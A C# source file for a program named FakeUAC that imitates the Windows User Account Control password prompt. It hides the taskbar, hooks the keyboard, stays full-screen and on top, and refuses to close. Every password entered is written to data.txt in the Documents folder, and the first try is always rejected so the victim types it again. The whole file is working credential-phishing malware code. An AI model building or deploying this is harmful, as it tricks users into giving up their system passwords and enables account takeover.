using System.ComponentModel;
using System.IO;
using System.Management;
using System.Security.Principal;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media.Imaging;
using static FakeUAC.GlobalUsings;
using static FakeUAC.NativeConstants;
using static FakeUAC.Texts;

namespace FakeUAC
{
	public class MainLogic
	{
		private bool _win11 = Environment.OSVersion.Version.Build >= 22000;

		private TextBlock _showMore, _programLoc, _wrongData;
		private PasswordBox _password;

		private static IntPtr _hookID = IntPtr.Zero;
		private static LowLevelKeyboardProc _proc = HookManager.HookCallback;
		private int lHwnd = FindWindow("Shell_TrayWnd", null);
		private bool _close = false;
		private int _counter = 0;

		public void Init(Window window, Image icon, PasswordBox password, TextBlock title, TextBlock question, TextBlock exeName, TextBlock publisher, TextBlock origin, TextBlock showMore, TextBlock programLoc, TextBlock continueText, TextBlock moreOptions, Button yes, Button no, TextBlock wrongData, TextBlock passwordText, TextBlock admin_user, TextBlock admin_user_path)
		{
			_password = password;

			title?.Text = texts["title"];
			question?.Text = texts["question"];
			exeName?.Text = texts["exeName"];
			publisher?.Text = texts["publisher"];
			yes?.Content = texts["yes"];
			no?.Content = texts["no"];
			origin?.Text = texts["origin"];
			passwordText?.Text = texts["passwordText"];
			wrongData?.Text = _win11 ? texts["wrongData10"] : texts["wrongData10"];
			moreOptions?.Text = texts["moreOptions"];
			continueText?.Text = texts["continueText"];


			showMore.Text = texts["showMore"];
			programLoc.Text = texts["programLoc"];


			_wrongData = wrongData;
			_showMore = showMore;
			_programLoc = programLoc;

			var collection = new ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem").Get();
			admin_user?.Text = collection.Cast<ManagementBaseObject>().First()["UserName"].ToString().Split("\\").LastOrDefault("Unknown");
			admin_user_path?.Text = WindowsIdentity.GetCurrent()?.Name ?? "Unknown";

			var doc = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "icon.png");
			var path = File.Exists(doc) ? doc : "./Images/icon.png";
			if (File.Exists(path))
				icon.Source = new BitmapImage(new Uri(Path.GetFullPath(path)));

			ShowWindow(lHwnd, SW_HIDE);
			SendMessage((IntPtr)lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
			_hookID = HookManager.SetHook(_proc);

			window.Left = 0;
			window.Top = 0;
			window.WindowState = WindowState.Maximized;
			window.Topmost = true;
			window.Title = texts["exeName"] + " installer";

			window.Closing += OnExit;
		}

		public void ShowMore(object sender, MouseButtonEventArgs e) {
			if (e.LeftButton != MouseButtonState.Pressed)
				return;

			if (_showMore.Text.Contains(texts["showMore"]))
			{
				_programLoc.Visibility = Visibility.Visible;
				_showMore.Text = texts["hideMore"];
			}
			else
			{
				_programLoc.Visibility = Visibility.Collapsed;
				_showMore.Text = texts["showMore"];
			}
		}

		public void Close(object sender, MouseButtonEventArgs e)
		{
			if (e.ChangedButton == MouseButton.Left)
				Exit();
		}

		public void OnExit(object sender, CancelEventArgs e)
		{
			if (!_close)
				e.Cancel = true;
		}

		public void Confirm(object sender, RoutedEventArgs e)
		{
			string pass = _password.Password;

			if (string.IsNullOrEmpty(pass))
			{
				_wrongData.Visibility = Visibility.Visible;
				return;
			}

			SavePassword(pass);

			_counter++;
			if (_counter >= 2)
				Exit();
			else
				_wrongData.Visibility = Visibility.Visible;
		}

		public void Exit()
		{
			ShowWindow(lHwnd, SW_SHOW);
			SendMessage((IntPtr)lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);

			UnhookWindowsHookEx(_hookID);

			_close = true;
			Environment.Exit(0);
		}

		private void SavePassword(string pass)
		{
			string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
			string path = Path.Combine(documentsPath, "data.txt");
			File.AppendAllText(path, $"{pass}\n");
		}
	}
}
